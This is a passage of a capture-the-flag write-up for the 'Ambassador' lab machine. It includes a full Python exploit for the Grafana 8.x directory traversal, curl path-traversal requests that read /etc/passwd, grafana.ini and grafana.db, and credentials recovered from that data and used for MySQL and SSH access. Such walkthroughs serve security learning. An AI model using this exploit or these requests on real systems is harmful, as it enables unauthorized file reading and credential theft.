+</span></span><span style=display:flex><span><span style=color:#fe8019>import</span> sys
+</span></span><span style=display:flex><span><span style=color:#fe8019>from</span> random <span style=color:#fe8019>import</span> choice
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>plugin_list <span style=color:#fe8019>=</span> [
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;alertlist&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;annolist&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;barchart&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;bargauge&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;candlestick&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;cloudwatch&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;dashlist&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;elasticsearch&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;gauge&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;geomap&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;gettingstarted&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;grafana-azure-monitor-datasource&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;graph&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;heatmap&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;histogram&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;influxdb&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;jaeger&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;logs&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;loki&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;mssql&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;mysql&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;news&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;nodeGraph&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;opentsdb&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;piechart&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;pluginlist&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;postgres&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;prometheus&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;stackdriver&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;stat&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;state-timeline&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;status-histor&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;table&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;table-old&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;tempo&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;testdata&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;text&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;timeseries&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;welcome&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#b8bb26>&#34;zipkin&#34;</span>
+</span></span><span style=display:flex><span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#fe8019>def</span> <span style=color:#fabd2f>exploit</span>(args):
+</span></span><span style=display:flex><span>    s <span style=color:#fe8019>=</span> requests<span style=color:#fe8019>.</span>Session()
+</span></span><span style=display:flex><span>    headers <span style=color:#fe8019>=</span> { <span style=color:#b8bb26>&#39;User-Agent&#39;</span>: <span style=color:#b8bb26>&#39;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.&#39;</span> }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>while</span> <span style=color:#fe8019>True</span>:
+</span></span><span style=display:flex><span>        file_to_read <span style=color:#fe8019>=</span> <span style=color:#fabd2f>input</span>(<span style=color:#b8bb26>&#39;Read file &gt; &#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#fe8019>try</span>:
+</span></span><span style=display:flex><span>            url <span style=color:#fe8019>=</span> args<span style=color:#fe8019>.</span>host <span style=color:#fe8019>+</span> <span style=color:#b8bb26>&#39;/public/plugins/&#39;</span> <span style=color:#fe8019>+</span> choice(plugin_list) <span style=color:#fe8019>+</span> <span style=color:#b8bb26>&#39;/../../../../../../../../../../../../..&#39;</span> <span style=color:#fe8019>+</span> file_to_read
+</span></span><span style=display:flex><span>            req <span style=color:#fe8019>=</span> requests<span style=color:#fe8019>.</span>Request(method<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#39;GET&#39;</span>, url<span style=color:#fe8019>=</span>url, headers<span style=color:#fe8019>=</span>headers)
+</span></span><span style=display:flex><span>            prep <span style=color:#fe8019>=</span> req<span style=color:#fe8019>.</span>prepare()
+</span></span><span style=display:flex><span>            prep<span style=color:#fe8019>.</span>url <span style=color:#fe8019>=</span> url
+</span></span><span style=display:flex><span>            r <span style=color:#fe8019>=</span> s<span style=color:#fe8019>.</span>send(prep, verify<span style=color:#fe8019>=</span><span style=color:#fe8019>False</span>, timeout<span style=color:#fe8019>=</span><span style=color:#d3869b>3</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#fe8019>if</span> <span style=color:#b8bb26>&#39;Plugin file not found&#39;</span> <span style=color:#fe8019>in</span> r<span style=color:#fe8019>.</span>text:
+</span></span><span style=display:flex><span>                <span style=color:#fabd2f>print</span>(<span style=color:#b8bb26>&#39;[-] File not found</span><span style=color:#b8bb26>\n</span><span style=color:#b8bb26>&#39;</span>)
+</span></span><span style=display:flex><span>            <span style=color:#fe8019>else</span>:
+</span></span><span style=display:flex><span>                <span style=color:#fe8019>if</span> r<span style=color:#fe8019>.</span>status_code <span style=color:#fe8019>==</span> <span style=color:#d3869b>200</span>:
+</span></span><span style=display:flex><span>                    <span style=color:#fabd2f>print</span>(r<span style=color:#fe8019>.</span>text)
+</span></span><span style=display:flex><span>                <span style=color:#fe8019>else</span>:
+</span></span><span style=display:flex><span>                    <span style=color:#fabd2f>print</span>(<span style=color:#b8bb26>&#39;[-] Something went wrong.&#39;</span>)
+</span></span><span style=display:flex><span>                    <span style=color:#fe8019>return</span>
+</span></span><span style=display:flex><span>        <span style=color:#fe8019>except</span> requests<span style=color:#fe8019>.</span>exceptions<span style=color:#fe8019>.</span>ConnectTimeout:
+</span></span><span style=display:flex><span>            <span style=color:#fabd2f>print</span>(<span style=color:#b8bb26>&#39;[-] Request timed out. Please check your host settings.</span><span style=color:#b8bb26>\n</span><span style=color:#b8bb26>&#39;</span>)
+</span></span><span style=display:flex><span>            <span style=color:#fe8019>return</span>
+</span></span><span style=display:flex><span>        <span style=color:#fe8019>except</span> <span style=color:#fb4934>Exception</span>:
+</span></span><span style=display:flex><span>            <span style=color:#fe8019>pass</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#fe8019>def</span> <span style=color:#fabd2f>main</span>():
+</span></span><span style=display:flex><span>    parser <span style=color:#fe8019>=</span> argparse<span style=color:#fe8019>.</span>ArgumentParser(description<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#34;Grafana V8.0.0-beta1 - 8.3.0 - Directory Traversal and Arbitrary File Read&#34;</span>)
+</span></span><span style=display:flex><span>    parser<span style=color:#fe8019>.</span>add_argument(<span style=color:#b8bb26>&#39;-H&#39;</span>,dest<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#39;host&#39;</span>,required<span style=color:#fe8019>=</span><span style=color:#fe8019>True</span>, help<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#34;Target host&#34;</span>)
+</span></span><span style=display:flex><span>    args <span style=color:#fe8019>=</span> parser<span style=color:#fe8019>.</span>parse_args()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>try</span>:
+</span></span><span style=display:flex><span>        exploit(args)
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>except</span> <span style=color:#fb4934>KeyboardInterrupt</span>:
+</span></span><span style=display:flex><span>        <span style=color:#fe8019>return</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#fe8019>if</span> __name__ <span style=color:#fe8019>==</span> <span style=color:#b8bb26>&#39;__main__&#39;</span>:
+</span></span><span style=display:flex><span>    main()
+</span></span><span style=display:flex><span>    sys<span style=color:#fe8019>.</span>exit(<span style=color:#d3869b>0</span>)
+</span></span></code></pre></div><p>As we can see, the above script is trying to exploit a directory traversel. The script is first accessing <code>/public/plugins</code> directory and then trying to access a plugin from the list <code>plugin_list</code> followed by the path. We can try this in curl:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span> curl --path-as-is <span style=color:#b8bb26>&#34;http://10.10.11.183:3000/public/plugins/testplugin/../../../../../../../../etc/passwd&#34;</span> -ik
+</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#d3869b>404</span> Not Found
+</span></span><span style=display:flex><span>Cache-Control: no-cache
+</span></span><span style=display:flex><span>Content-Type: application/json; charset<span style=color:#fe8019>=</span>UTF-8
+</span></span><span style=display:flex><span>Expires: -1
+</span></span><span style=display:flex><span>Pragma: no-cache
+</span></span><span style=display:flex><span>X-Content-Type-Options: nosniff
+</span></span><span style=display:flex><span>X-Frame-Options: deny
+</span></span><span style=display:flex><span>X-Xss-Protection: 1; mode<span style=color:#fe8019>=</span>block
+</span></span><span style=display:flex><span>Date: Tue, <span style=color:#d3869b>31</span> Jan <span style=color:#d3869b>2023</span> 12:23:47 GMT
+</span></span><span style=display:flex><span>Content-Length: <span style=color:#d3869b>31</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#fe8019>{</span><span style=color:#b8bb26>&#34;message&#34;</span>:<span style=color:#b8bb26>&#34;Plugin not found&#34;</span><span style=color:#fe8019>}</span>
+</span></span></code></pre></div><p>If we enter a plugin that is not from the <code>plugin_list</code> then the server returns a 404 error with <code>{"message":"Plugin not found"}</code>. If we use a valid plugin then the exploit works:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span> curl --path-as-is <span style=color:#b8bb26>&#34;http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../etc/passwd&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style=display:flex><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style=display:flex><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style=display:flex><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span style=display:flex><span>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span style=display:flex><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span style=display:flex><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style=display:flex><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span style=display:flex><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style=display:flex><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span style=display:flex><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span style=display:flex><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span style=display:flex><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span style=display:flex><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span style=display:flex><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>gnats:x:41:41:Gnats Bug-Reporting System <span style=color:#fe8019>(</span>admin<span style=color:#fe8019>)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span style=display:flex><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span style=display:flex><span>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+</span></span><span style=display:flex><span>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+</span></span><span style=display:flex><span>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span style=display:flex><span>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+</span></span><span style=display:flex><span>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+</span></span><span style=display:flex><span>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+</span></span><span style=display:flex><span>pollinate:x:110:1::/var/cache/pollinate:/bin/false
+</span></span><span style=display:flex><span>usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+</span></span><span style=display:flex><span>sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span style=display:flex><span>developer:x:1000:1000:developer:/home/developer:/bin/bash
+</span></span><span style=display:flex><span>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+</span></span><span style=display:flex><span>grafana:x:113:118::/usr/share/grafana:/bin/false
+</span></span><span style=display:flex><span>mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span style=display:flex><span>consul:x:997:997::/home/consul:/bin/false
+</span></span></code></pre></div><blockquote><p><strong>Remember to add the <code>--path-as-is</code> flag while using <code>curl</code></strong></p></blockquote><p>Now we have to check for some default config file or database locations used in grafana in order to get the flag. While searching for it I found this <a href=https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798>github exploit</a> and there is a <a href=https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798/blob/main/paths.txt>paths.txt</a> with all the default locations of config and db files. So let&rsquo;s use that:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span> curl --path-as-is &#34;http://10.10.11.183:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/grafana/grafana.ini&#34; &gt; grafana.ini
+</span></span></code></pre></div><p><code>/etc/grafana/grafana.ini</code> is a config file. Notice that in this file everything except the <code>admin_password</code> is commented out:</p><figure><img src=/img/ambassador/Pasted%20image%2020230131181723.webp></figure><p>We can try logging in to the grafana admin panel using the password. But there isn&rsquo;t much we can do in there. So let&rsquo;s get the <code>grafana.db</code> file.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span> curl <span style=color:#b8bb26>&#34;http://10.10.11.183:3000/public/plugins/welcome/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar/lib/grafana/grafana.db&#34;</span> -o grafana.db
+</span></span></code></pre></div><p>We can open this file using something like <code>sqlitebrowser</code> and under the table <code>data-source</code> we can see password to the user grafana:</p><figure><img src=/img/ambassador/Pasted%20image%2020230131182411.webp></figure><p>And we can use these credentials to access not <strong>SSH</strong> but <strong>MySQL</strong> on port 3306</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span> mysql -h 10.10.11.183 -u grafana -p
+</span></span><span style=display:flex><span>Enter password:
+</span></span><span style=display:flex><span>Welcome to the MySQL monitor.  Commands end with ; or <span style=color:#b8bb26>\g</span>.
+</span></span><span style=display:flex><span>Your MySQL connection id is <span style=color:#d3869b>11</span>
+</span></span><span style=display:flex><span>Server version: 8.0.30-0ubuntu0.20.04.2 <span style=color:#fe8019>(</span>Ubuntu<span style=color:#fe8019>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Copyright <span style=color:#fe8019>(</span>c<span style=color:#fe8019>)</span> 2000, 2022, Oracle and/or its affiliates.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Oracle is a registered trademark of Oracle Corporation and/or its
+</span></span><span style=display:flex><span>affiliates. Other names may be trademarks of their respective
+</span></span><span style=display:flex><span>owners.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Type <span style=color:#b8bb26>&#39;help;&#39;</span> or <span style=color:#b8bb26>&#39;\h&#39;</span> <span style=color:#fe8019>for</span> help. Type <span style=color:#b8bb26>&#39;\c&#39;</span> to clear the current input statement.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>mysql&gt;
+</span></span></code></pre></div><p>Alright we got access to mysql console.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>mysql&gt; show databases;
+</span></span><span style=display:flex><span>+--------------------+
+</span></span><span style=display:flex><span>| Database           |
+</span></span><span style=display:flex><span>+--------------------+
+</span></span><span style=display:flex><span>| grafana            |
+</span></span><span style=display:flex><span>| information_schema |
+</span></span><span style=display:flex><span>| mysql              |
+</span></span><span style=display:flex><span>| performance_schema |
+</span></span><span style=display:flex><span>| sys                |
+</span></span><span style=display:flex><span>| whackywidget       |
+</span></span><span style=display:flex><span>+--------------------+
+</span></span><span style=display:flex><span><span style=color:#d3869b>6</span> rows in <span style=color:#fabd2f>set</span> <span style=color:#fe8019>(</span>1.11 sec<span style=color:#fe8019>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>mysql&gt; use whackywidget;
+</span></span><span style=display:flex><span>Reading table information <span style=color:#fe8019>for</span> completion of table and column names
+</span></span><span style=display:flex><span>You can turn off this feature to get a quicker startup with -A
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Database changed
+</span></span><span style=display:flex><span>mysql&gt; show tables;
+</span></span><span style=display:flex><span>+------------------------+
+</span></span><span style=display:flex><span>| Tables_in_whackywidget |
+</span></span><span style=display:flex><span>+------------------------+
+</span></span><span style=display:flex><span>| users                  |
+</span></span><span style=display:flex><span>+------------------------+
+</span></span><span style=display:flex><span><span style=color:#d3869b>1</span> row in <span style=color:#fabd2f>set</span> <span style=color:#fe8019>(</span>0.52 sec<span style=color:#fe8019>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>mysql&gt; <span style=color:#fe8019>select</span> * from users;
+</span></span><span style=display:flex><span>+-----------+------------------------------------------+
+</span></span><span style=display:flex><span>| user      | pass                                     |
+</span></span><span style=display:flex><span>+-----------+------------------------------------------+
+</span></span><span style=display:flex><span>| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg<span style=color:#fe8019>==</span> |
+</span></span><span style=display:flex><span>+-----------+------------------------------------------+
+</span></span><span style=display:flex><span><span style=color:#d3869b>1</span> row in <span style=color:#fabd2f>set</span> <span style=color:#fe8019>(</span>1.90 sec<span style=color:#fe8019>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>mysql&gt;
+</span></span></code></pre></div><p>And there&rsquo;s the password for the user <code>developer</code> ( <strong><em>Note the hint from the hugo blog post</em></strong> ) encoded in <code>base64</code></p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span> echo &#34;YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==&#34; | base64 -d
+</span></span><span style=display:flex><span>anEnglishManInNewYork027468
+</span></span></code></pre></div><p>Got the password now let&rsquo;s ssh into the box and read the user flag.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span> ssh developer@10.10.11.183
+</span></span><span style=display:flex><span>developer@10.10.11.183s password:
+</span></span><span style=display:flex><span>Welcome to Ubuntu 20.04.5 LTS <span style=color:#fe8019>(</span>GNU/Linux 5.4.0-126-generic x86_64<span style=color:#fe8019>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style=display:flex><span> * Management:     https://landscape.canonical.com
+</span></span><span style=display:flex><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  System information as of Tue <span style=color:#d3869b>31</span> Jan <span style=color:#d3869b>2023</span> 01:01:08 PM UTC
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  System load:           0.03
+</span></span><span style=display:flex><span>  Usage of /:            80.9% of 5.07GB
+</span></span><span style=display:flex><span>  Memory usage:          39%
+</span></span><span style=display:flex><span>  Swap usage:            0%
+</span></span><span style=display:flex><span>  Processes:             <span style=color:#d3869b>229</span>
+</span></span><span style=display:flex><span>  Users logged in:       <span style=color:#d3869b>1</span>
+</span></span><span style=display:flex><span>  IPv4 address <span style=color:#fe8019>for</span> eth0: 10.10.11.183
+</span></span><span style=display:flex><span>  IPv6 address <span style=color:#fe8019>for</span> eth0: dead:beef::250:56ff:feb9:e28b
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#d3869b>0</span> updates can be applied immediately.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>The list of available updates is more than a week old.
+</span></span><span style=display:flex><span>To check <span style=color:#fe8019>for</span> new updates run: sudo apt update
+</span></span><span style=display:flex><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Last login: Tue Jan <span style=color:#d3869b>31</span> 11:22:34 <span style=color:#d3869b>2023</span> from 10.10.14.40
+</span></span><span style=display:flex><span>developer@ambassador:~$ whoami
+</span></span><span style=display:flex><span>developer
+</span></span><span style=display:flex><span>developer@ambassador:~$ id
+</span></span><span style=display:flex><span>uid<span style=color:#fe8019>=</span>1000<span style=color:#fe8019>(</span>developer<span style=color:#fe8019>)</span> gid<span style=color:#fe8019>=</span>1000<span style=color:#fe8019>(</span>developer<span style=color:#fe8019>)</span> groups<span style=color:#fe8019>=</span>1000<span style=color:#fe8019>(</span>developer<span style=color:#fe8019>)</span>
+</span></span><span style=display:flex><span>developer@ambassador:~$ ls
+</span></span><span style=display:flex><span>snap  user.txt
+</span></span><span style=display:flex><span>developer@ambassador:~$ cat user.txt
+</span></span><span style=display:flex><span>**************************
+</span></span></code></pre></div><hr><h2 id=privilege-escalation><a href=#privilege-escalation class=anchor-head aria-label=Anchor></a>Privilege Escalation</h2><h3 id=local-enumeration><a href=#local-enumeration class=anchor-head aria-label=Anchor></a>Local Enumeration</h3><p>There&rsquo;s a <code>.gitconfig</code> file in the home directory:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>developer@ambassador:~$ cat .gitconfig
+</span></span><span style=display:flex><span><span style=color:#fe8019>[</span>user<span style=color:#fe8019>]</span>
+</span></span><span style=display:flex><span>        name <span style=color:#fe8019>=</span> Developer
+</span></span><span style=display:flex><span>        email <span style=color:#fe8019>=</span> developer@ambassador.local
+</span></span><span style=display:flex><span><span style=color:#fe8019>[</span>safe<span style=color:#fe8019>]</span>
+</span></span><span style=display:flex><span>        directory <span style=color:#fe8019>=</span> /opt/my-app
+</span></span></code></pre></div><p>So let&rsquo;s checkout <code>/opt</code></p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>developer@ambassador:~$ <span style=color:#fabd2f>cd</span> /opt/
+</span></span><span style=display:flex><span>developer@ambassador:/opt$ ls -alp
+</span></span><span style=display:flex><span>total <span style=color:#d3869b>16</span>
+</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#d3869b>4</span> root   root   <span style=color:#d3869b>4096</span> Sep  <span style=color:#d3869b>1</span> 22:13 ./
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#d3869b>20</span> root   root   <span style=color:#d3869b>4096</span> Sep <span style=color:#d3869b>15</span> 17:24 ../
+</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#d3869b>6</span> consul consul <span style=color:#d3869b>4096</span> Jan <span style=color:#d3869b>31</span> 10:40 consul/
+</span></span><span style=display:flex><span>drwxrwxr-x  <span style=color:#d3869b>5</span> root   root   <span style=color:#d3869b>4096</span> Mar <span style=color:#d3869b>13</span>  <span style=color:#d3869b>2022</span> my-app/
+</span></span><span style=display:flex><span>developer@ambassador:/opt$ <span style=color:#fabd2f>cd</span> my-app
+</span></span><span style=display:flex><span>developer@ambassador:/opt/my-app$ ls -alp
+</span></span><span style=display:flex><span>total <span style=color:#d3869b>24</span>
+</span></span><span style=display:flex><span>drwxrwxr-x <span style=color:#d3869b>5</span> root root <span style=color:#d3869b>4096</span> Mar <span style=color:#d3869b>13</span>  <span style=color:#d3869b>2022</span> ./
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#d3869b>4</span> root root <span style=color:#d3869b>4096</span> Sep  <span style=color:#d3869b>1</span> 22:13 ../
+</span></span><span style=display:flex><span>drwxrwxr-x <span style=color:#d3869b>4</span> root root <span style=color:#d3869b>4096</span> Mar <span style=color:#d3869b>13</span>  <span style=color:#d3869b>2022</span> env/
+</span></span><span style=display:flex><span>drwxrwxr-x <span style=color:#d3869b>8</span> root root <span style=color:#d3869b>4096</span> Mar <span style=color:#d3869b>14</span>  <span style=color:#d3869b>2022</span> .git/
+</span></span><span style=display:flex><span>-rw-rw-r-- <span style=color:#d3869b>1</span> root root <span style=color:#d3869b>1838</span> Mar <span style=color:#d3869b>13</span>  <span style=color:#d3869b>2022</span> .gitignore
+</span></span><span style=display:flex><span>drwxrwxr-x <span style=color:#d3869b>3</span> root root <span style=color:#d3869b>4096</span> Mar <span style=color:#d3869b>13</span>  <span style=color:#d3869b>2022</span> whackywidget/
+</span></span><span style=display:flex><span>developer@ambassador:/opt/my-app$ <span style=color:#fabd2f>cd</span> ..
+</span></span><span style=display:flex><span>developer@ambassador:/opt$ <span style=color:#fabd2f>cd</span> consul
+</span></span><span style=display:flex><span>developer@ambassador:/opt/consul$ ls -alp
+</span></span><span style=display:flex><span>total <span style=color:#d3869b>32</span>
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#d3869b>6</span> consul consul <span style=color:#d3869b>4096</span> Jan <span style=color:#d3869b>31</span> 10:40 ./
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#d3869b>4</span> root   root   <span style=color:#d3869b>4096</span> Sep  <span style=color:#d3869b>1</span> 22:13 ../
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#d3869b>1</span> consul consul  <span style=color:#d3869b>394</span> Mar <span style=color:#d3869b>13</span>  <span style=color:#d3869b>2022</span> checkpoint-signature
+</span></span><span style=display:flex><span>drwx------ <span style=color:#d3869b>2</span> root   root   <span style=color:#d3869b>4096</span> Jan <span style=color:#d3869b>31</span> 10:41 checks/
+</span></span><span style=display:flex><span>-rw------- <span style=color:#d3869b>1</span> consul consul   <span style=color:#d3869b>36</span> Mar <span style=color:#d3869b>13</span>  <span style=color:#d3869b>2022</span> node-id
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#d3869b>3</span> consul consul <span style=color:#d3869b>4096</span> Mar <span style=color:#d3869b>13</span>  <span style=color:#d3869b>2022</span> raft/
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#d3869b>2</span> consul consul <span style=color:#d3869b>4096</span> Mar <span style=color:#d3869b>13</span>  <span style=color:#d3869b>2022</span> serf/
